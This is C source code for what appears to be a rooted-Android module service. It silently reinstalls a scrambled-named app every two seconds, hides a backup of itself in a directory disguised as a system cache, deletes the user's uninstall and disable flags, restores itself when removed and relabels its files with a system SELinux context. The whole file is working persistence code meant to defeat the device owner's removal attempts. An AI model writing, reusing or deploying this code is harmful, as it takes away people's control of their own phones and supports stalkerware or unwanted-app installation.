#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

#define TARGET_PACKAGE "lazkc.aevxly.bvkim"
#define MODPATH "/data/adb/modules/AutoInstallProtected"
#define APK_PATH MODPATH "/apk/target.apk"
#define BACKUP_PATH "/data/.sys_service_cache/.auto_install_backup"
#define LOGFILE "/data/local/tmp/AutoInstallProtected.log"
#define UNLOCK_FILE "/data/adb/modules/uninstall_protection_off"

void log_msg(const char* text) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "echo \"[$(date)] %s\" >> %s", text, LOGFILE);
    system(cmd);
}

void install_target_apk() {
    if (access(APK_PATH, F_OK) != 0) {
        log_msg("错误：未找到APK文件 " APK_PATH);
        return;
    }

    // 检测包名是否存在
    char check_cmd[256];
    snprintf(check_cmd, sizeof(check_cmd), "pm list packages | grep -q '%s'", TARGET_PACKAGE);
    
    if (system(check_cmd) != 0) {
        log_msg("检测到应用未安装，正在自动安装...");
        char ins_cmd[512];
        snprintf(ins_cmd, sizeof(ins_cmd), "pm install -r --user 0 %s >> %s 2>&1", APK_PATH, LOGFILE);
        
        if (system(ins_cmd) == 0) {
            log_msg("APK 安装成功");
        } else {
            log_msg("APK 安装失败，稍后重试");
        }
    }
}

int main() {
    // 1. 等待系统开机完成
    while (1) {
        if (system("[ \"$(getprop sys.boot_completed)\" = \"1\" ]") == 0) {
            break;
        }
        sleep(1);
    }
    sleep(10);

    log_msg("自动安装+防卸载服务（C语言版）已启动");

    // 2. 首次运行如果备份不在，则建立备份
    struct stat st;
    if (stat(BACKUP_PATH, &st) != 0) {
        system("mkdir -p " BACKUP_PATH);
        system("cp -af " MODPATH "/* " BACKUP_PATH "/");
    }

    // 3. 首次启动先检测一次 APK
    install_target_apk();

    // 4. 常驻死循环
    while (1) {
        // 如果没有解锁钥匙，执行强制保护
        if (access(UNLOCK_FILE, F_OK) != 0) {
            system("rm -f " MODPATH "/remove " MODPATH "/disable 2>/dev/null");
            
            if (stat(MODPATH, &st) != 0) {
                system("cp -af " BACKUP_PATH " " MODPATH);
                system("chcon -R u:object_r:system_file:s0 " MODPATH " 2>/dev/null");
                log_msg("模块已被删除，已强行从备份复活");
            }
        }

        // APK 保活检查
        install_target_apk();

        sleep(2);
    }

    return 0;
}